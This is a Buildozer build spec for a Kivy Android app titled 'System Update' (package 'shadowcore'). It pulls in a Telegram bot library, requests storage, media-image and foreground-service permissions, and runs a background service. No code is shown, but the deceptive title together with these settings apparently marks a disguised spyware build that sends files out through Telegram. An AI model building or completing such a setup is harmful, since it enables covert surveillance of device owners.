[app]
title = System Update
package.name = shadowcore
package.domain = org.test
source.dir = .
source.include_exts = py,png,jpg,kv,atlas
version = 1.0

# المكتبات المطلوبة للتعامل مع التليجرام والأندرويد
requirements = python3,kivy,pyjnius,requests,pyTelegramBotAPI

android.permissions = INTERNET, WAKE_LOCK, FOREGROUND_SERVICE, READ_EXTERNAL_STORAGE, WRITE_EXTERNAL_STORAGE, READ_MEDIA_IMAGES

android.api = 33
services = Service:service.py
android.archs = arm64-v8a, armeabi-v7a

[buildozer]
log_level = 2
